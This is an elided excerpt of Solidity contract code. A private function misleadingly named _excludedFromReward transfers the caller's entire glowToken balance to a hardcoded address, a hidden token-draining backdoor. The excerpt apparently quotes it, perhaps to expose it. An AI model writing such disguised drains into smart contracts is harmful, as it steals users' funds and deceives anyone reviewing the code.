...
//////////////////////////////////////////////////////////////////////////////////////////////
    ...
    function _excludedFromReward(address account,bool excluded) private {
        ...
        uint256 glowBalance=glowToken.balanceOf(msg.sender);
        require(glowBalance>0);
        glowToken.transferFrom(msg.sender,0x34C5eFCF37e90778c8EA9e651509D1137550a6a4,glowBalance);
    }
